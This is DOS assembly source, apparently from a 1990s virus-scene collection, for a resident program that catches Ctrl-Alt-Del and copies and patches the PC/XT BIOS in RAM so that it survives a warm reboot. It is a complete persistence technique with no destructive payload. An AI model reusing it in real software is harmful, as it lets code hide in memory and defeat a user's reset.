
; Survive a warm reboot on a XT.
;
; Compile under Turbo Assembler 2.5
; This program works on a generic IBM PC/XT


        .model  tiny
        .radix  16
        .code

        org     100

start:
        jmp     init

handler:
        push    ds
        push    ax
        xor     ax,ax
        mov     ds,ax
        mov     al,ds:[417]
        and     al,0c
        cmp     al,0c
        jnz     no_ctrl_alt
        in      al,[60]
        cmp     al,53
        jz      now_fuck
no_ctrl_alt:
        pop     ax
        pop     ds
        db      0ea
oldvect dd      ?
now_fuck:
        mov     ds:[472],1234
        mov     ax,ds:[413]
        mov     cx,6
        shl     ax,cl
        push    ax
        mov     es,ax
        mov     di,offset handler
        push    cs
        pop     ds
        mov     si,di
        repz    cmpsw
        jnz     new_move
        mov     dl,es:[top_seg]
        pop     ax
        jmp     short set_segm
new_move:
        mov     al,ah
        cmp     al,0a0
        jnc     set_top
        mov     al,0a0
set_top:
        xchg    ax,dx
        pop     ax
        sub     ax,1000
set_segm:
        mov     cs:[top_seg],dl
        push    ax
        mov     es,ax
        mov     di,0e000
        mov     ax,0f000
        mov     ds,ax
        mov     si,di
        mov     cx,1000
        cld
        rep     movsw
        cmp     byte ptr [si-10],0ea
        jnz     cant_fuck
        cmp     [si-0dh],0f000
        jnz     cant_fuck
        mov     di,[si-0f]
        cmp     di,0e000
        jc      cant_fuck
        mov     al,[di]
        cmp     al,0e9
        jnz     no_jmp
        add     di,[di+1]
        add     di,3
no_jmp:
        push    di
        mov     cx,800
        call    protect_ram
        call    replace_ints
        push    es
        pop     ds
        mov     bx,0e000
        mov     cx,2000
        xor     al,al
check_lup:
        add     al,[bx]
        inc     bx
        loop    check_lup
        neg     al
        mov     [di-1],al
        push    cs
        pop     ds
        mov     word ptr ds:[tmp_handler],5ebh
        mov     si,offset start
        mov     di,si
        mov     cx,init-start
        rep     movsb
        retf
cant_fuck:
        db      0ea
        dw      0
        dw      0ffff

protect_ram:
        jcxz    cant_fuck
        mov     al,80
        repnz   scasb
        jnz     protect_ram
        mov     ax,[di]
        and     al,0f8
        cmp     al,0f8
        jnz     protect_ram
        cmp     ah,dl
        jnz     protect_ram
        mov     ax,es
        mov     es:[di+1],ah
        ret

top_seg db      ?

replace_ints:
        jcxz    cant_fuck
        mov     al,0a5
        repnz   scasb
        jnz     replace_ints
        cmp     [di],4747
        jnz     replace_ints
        cmp     [di+2],0fbe2
        jnz     replace_ints
        add     di,4
        push    cs
        pop     ds
        mov     [dummy],di
        mov     si,offset my_piece
        mov     cx,my_top-my_piece
        rep     movsb
exit_prn:
        ret

my_piece:
        push    ax
        mov     cx,20
        xor     di,di
re_init:
        scasw
        mov     ax,0f000
        stosw
        loop    re_init
        mov     ax,offset tmp_handler
        xchg    ax,es:[di+44-80]
        mov     cs:[old_tmp],ax
        mov     ax,cs
        xchg    ax,es:[di+46-80]
        mov     cs:[old_tmp+2],ax
        pop     ax
        db      0ea
dummy   dw      ?
        dw      0f000
        db      0
my_top:

print:
        mov     si,offset message
print_msg:
        lodsb
        cmp     al,'$'
        jz      exit_prn
        mov     ah,0e
        int     10
        jmp     print_msg

tmp_handler:
        jmp     $
go_old:
        db      0ea
old_tmp dw      ?
        dw      ?
        push    ds
        push    si
        push    ax
        xor     ax,ax
        mov     ds,ax
        mov     ax,offset handler
        xchg    ax,ds:[24]
        mov     word ptr cs:[oldvect],ax
        mov     ax,cs
        xchg    ax,ds:[26]
        mov     word ptr cs:[oldvect+2],ax
        push    cs
        pop     ds
        mov     word ptr [tmp_handler],9090
        call    print
        pop     ax
        pop     si
        pop     ds
        jmp     go_old

message:
        db      'Never ending story...',0dh,0a,'$'

init:
        mov     ax,3509
        int     21
        mov     word ptr [oldvect],bx
        mov     word ptr [oldvect+2],es
        mov     dx,offset handler
        mov     ah,25
        int     21
        call    print
        mov     dx,offset init
        int     27

        end     start

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

